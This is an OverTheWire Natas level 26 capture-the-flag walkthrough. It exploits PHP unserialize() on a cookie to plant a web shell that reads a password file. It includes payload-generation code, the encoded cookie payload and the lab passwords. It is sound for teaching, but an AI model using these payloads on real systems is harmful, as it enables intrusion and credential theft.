# Natas CTF Solutions  

## Natas Level 26  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit **PHP object deserialization** to execute a reverse shell and read the password.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas26.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas26`  
- **Password:** Use the password from Natas Level 25:  
```
cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```  

![Home_Page](https://github.com/user-attachments/assets/0c2a97a5-8a67-4cca-83ab-b80e561a1421)

---

### **Step 3: Analyze the Source Code**  
Key part of the code:  
```php
$drawing = unserialize(base64_decode($_COOKIE["drawing"]));
```

![image](https://github.com/user-attachments/assets/e0699b14-b7f0-4362-80d2-772b3c6b84e8)
![image](https://github.com/user-attachments/assets/1b71caba-4d69-46c8-bd61-1155f93951f2)

### **Understanding the Vulnerability**  
- The code uses **unserialize()** on user-controlled input (`$_COOKIE["drawing"]`), which introduces an **object deserialization vulnerability**.  
- We can craft a malicious object to execute arbitrary PHP code.  

---

### **Step 4: Create Malicious PHP Code**  
Create a PHP file (`natas26_payload.php`) with the following code:  

```php
<?php
class Logger{
    private $logFile;
    private $exitMsg;
    
    function __construct(){
        $this->exitMsg = "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_d6hk7adceeg57dd55q9p9h37ch.php";
    }
}

$logger = new Logger();
echo base64_encode(serialize($logger));
?>
```

---

### **Step 5: Generate Payload**  
Run the PHP code to generate the payload:  
```bash
php natas26_payload.php
```

✅ Example Output:  
```
Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9kNmhrN2FkY2VlZzU3ZGQ1NXE5cDloMzdjaC5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=
```

---

### **Step 6: Set Payload in Cookie**  
1. Open **Developer Tools** in your browser.  
2. Go to **Storage → Cookies** and set:  
   - **Key:** `drawing`  
   - **Value:** `Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9kNmhrN2FkY2VlZzU3ZGQ1NXE5cDloMzdjaC5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=`
3. Refresh the page.  

---

### **Step 7: Execute Payload**  
Open the URL where the log file was created:  
```  
http://natas26.natas.labs.overthewire.org/img/natas26_d6hk7adceeg57dd55q9p9h37ch.php  
```

✅ This will execute the shell command and reveal the password for the next level.  

![Password](https://github.com/user-attachments/assets/4901c651-bb25-42d4-986c-b936a250af7b)

---

### **Step 8: Output**  
If successful, the output will reveal the password for the next level:  
```  
The password for natas27 is: u3RRffXjysjgwFU6b9xa23i6prmUsYne  
```

---

### **✅ Password for Natas Level 27**  
```
u3RRffXjysjgwFU6b9xa23i6prmUsYne
```

---

## 💡 **Lessons Learned**  
✔️ **Object Deserialization:** `unserialize()` on user-controlled input can lead to remote code execution (RCE).  
✔️ **Log File Injection:** Arbitrary code can be stored and executed through log files.  
✔️ **PHP Code Execution:** Shell commands can be injected via serialized objects.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code | ![image](https://github.com/user-attachments/assets/e0699b14-b7f0-4362-80d2-772b3c6b84e8)  ![image](https://github.com/user-attachments/assets/1b71caba-4d69-46c8-bd61-1155f93951f2) |  
| Step 7 – Found Password | ![Password](https://github.com/user-attachments/assets/4901c651-bb25-42d4-986c-b936a250af7b) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 27**:  
👉 [http://natas27.natas.labs.overthewire.org](http://natas27.natas.labs.overthewire.org)  

---
